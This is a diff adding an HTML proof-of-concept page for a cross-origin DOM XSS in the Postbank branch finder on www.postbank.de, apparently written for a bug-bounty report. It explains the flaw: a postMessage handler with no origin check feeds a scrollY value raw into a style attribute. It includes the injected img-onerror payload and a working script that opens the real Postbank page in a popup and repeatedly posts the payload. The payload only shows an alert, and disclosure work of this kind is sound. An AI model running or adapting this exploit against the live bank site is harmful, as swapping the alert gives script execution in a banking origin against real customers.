@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PostbankFinder DOM XSS — www.postbank.de</title>
+<style>
+  :root{ --bg:#0f1b2d; --card:#17263d; --ink:#e8eef7; --mut:#9fb3cc; --accent:#28c3a6; --warn:#ffb347; --line:#2a3d5c; }
+  *{ box-sizing:border-box; }
+  body{ margin:0; font:15px/1.6 ui-sans-serif,system-ui,Arial,sans-serif; background:var(--bg); color:var(--ink); }
+  .wrap{ max-width:780px; margin:0 auto; padding:28px 20px 60px; }
+  .hdr{ display:flex; align-items:center; gap:12px; border-bottom:1px solid var(--line); padding-bottom:16px; }
+  .dot{ width:12px; height:12px; border-radius:50%; background:var(--accent); box-shadow:0 0 12px var(--accent); }
+  h1{ font-size:19px; margin:0; font-weight:650; }
+  .sub{ color:var(--mut); font-size:13px; margin-top:2px; }
+  .card{ background:var(--card); border:1px solid var(--line); border-radius:12px; padding:16px 18px; margin:18px 0; }
+  .k{ color:var(--accent); font-weight:600; font-size:12px; letter-spacing:.06em; text-transform:uppercase; }
+  .chain{ list-style:none; margin:8px 0 0; padding:0; counter-reset:s; }
+  .chain li{ position:relative; padding:6px 0 6px 30px; border-left:2px solid var(--line); margin-left:9px; }
+  .chain li::before{ counter-increment:s; content:counter(s); position:absolute; left:-11px; top:6px; width:20px; height:20px;
+    background:var(--accent); color:#06281f; border-radius:50%; font-size:11px; font-weight:700; display:grid; place-items:center; }
+  code,.mono{ font-family:ui-monospace,Menlo,Consolas,monospace; font-size:12.5px; }
+  code{ background:#0b1626; color:#9fe8d6; padding:1px 5px; border-radius:4px; }
+  pre{ background:#0b1626; border:1px solid var(--line); border-radius:8px; padding:12px; overflow-x:auto; color:#cfe3f5; font-size:12px; }
+  .run{ font-size:16px; font-weight:600; padding:12px 26px; border:0; border-radius:10px; cursor:pointer;
+    background:var(--accent); color:#06281f; }
+  .run:active{ transform:translateY(1px); }
+  .note{ color:var(--warn); font-size:12.5px; }
+  .tag{ font-size:11px; background:#0b1626; border:1px solid var(--line); color:var(--mut); padding:2px 8px; border-radius:20px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="hdr">
+    <div class="dot"></div>
+    <div>
+      <h1>PostbankFinder — cross-origin DOM XSS on <code>www.postbank.de</code></h1>
+      <div class="sub">Authorized security research · Postbank bug-bounty scope (*.postbank.de) · proof fires <code>alert(document.domain)</code> only</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="k">The vulnerability</div>
+    <p style="margin:.5em 0 0">
+      The <b>PostbankFinder</b> locator on <code>www.postbank.de</code> has a <code>window</code>
+      <code>"message"</code> handler with <b>no origin check</b>: it stores the attacker's <code>scrollY</code>
+      from <code>JSON.parse(event.data)</code>, then <code>attachTooltip()</code> interpolates it
+      <b>raw</b> into <code>style="top:${scrollY}px;"</code> in the tooltip HTML. A <code>"</code> in
+      <code>scrollY</code> breaks out and injects HTML into the page. No <code>script-src</code> CSP &rarr; the
+      <code>&lt;img onerror&gt;</code> runs. Needs the mobile layout (<code>innerWidth&lt;984</code>, so an 820px
+      popup) and a search to render the tooltip.
+    </p>
+  </div>
+
+  <div class="card">
+    <div class="k">Exploit chain</div>
+    <ol class="chain">
+      <li>Attacker page opens the finder in an 820px popup (<code>innerWidth&lt;984</code> &rarr; mobile layout).</li>
+      <li><code>postMessage(JSON.stringify({type:"viewchange", scrollY: PAYLOAD}))</code> &mdash; no origin check &rarr; stored.</li>
+      <li>Victim runs a search &rarr; a result tooltip renders &rarr; <code>attachTooltip()</code> writes <code>top:${scrollY}px;"</code> raw.</li>
+      <li><code>scrollY</code> breaks out of the attribute &rarr; <code>&lt;img src=x onerror=alert(document.domain)&gt;</code> executes in the <code>www.postbank.de</code> origin.</li>
+    </ol>
+    <div style="margin-top:12px" class="k">scrollY payload</div>
+    <pre id="pv"></pre>
+  </div>
+
+  <div class="card">
+    <div class="k">Run it</div>
+    <ol style="margin:.4em 0 1em; padding-left:20px; color:var(--mut)">
+      <li style="color:var(--ink)">Click <b>Run PoC</b> (one click lets the browser open the popup; it opens at 820px for the <code>ltDesktop</code> layout).</li>
+      <li style="color:var(--ink)">In the Postbank popup, accept the cookie banner if shown, then click <b>&ldquo;Suche anwenden&rdquo;</b>.</li>
+      <li style="color:var(--ink)"><code>alert("www.postbank.de")</code> fires in the Postbank origin.</li>
+    </ol>
+    <button class="run" onclick="runPoC()">▶ Run PoC</button>
+    <p class="note" style="margin-top:14px">For authorized testing only. The payload runs <code>alert(document.domain)</code> and nothing else.</p>
+  </div>
+
+</div>
+
+<script>
+var FINDER = 'https://www.postbank.de/cip/rest/api/url/yellowmap2018/Home/Index?1&SingleSlotGeo=berlin&label=branch&filters=PbAtm,PbBranch,Shell,';
+var SCROLLY = '0px;"><img src=x id=pbxmarker onerror="alert(document.domain)"><div x="';
+document.getElementById('pv').textContent = SCROLLY;
+
+function runPoC(){
+  var w = window.open(FINDER, 'pbf', 'width=820,height=900');   // <984 -> ltDesktop() true
+  var msg = JSON.stringify({ type:'viewchange', height:300, scrollY: SCROLLY });
+  setInterval(function(){ try{ w.postMessage(msg, '*'); }catch(e){} }, 40);
+}
+</script>
+</body>
+</html>
